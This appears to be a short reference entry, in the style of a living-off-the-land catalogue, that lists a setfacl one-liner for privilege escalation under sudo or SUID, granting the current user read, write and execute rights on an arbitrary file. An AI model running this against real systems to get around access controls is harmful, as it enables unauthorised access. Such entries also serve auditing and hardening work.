setfacl
=======

Privilege Escalation
--------------------

[Sudo]
    setfacl -m u:$(id -un):rwx /path/to/input-file
    This can be run with elevated privileges to change ownership and then read, write, or execute a file.

[SUID]
    setfacl -m u:$(id -un):rwx /path/to/input-file
    This can be run with elevated privileges to change ownership and then read, write, or execute a file.
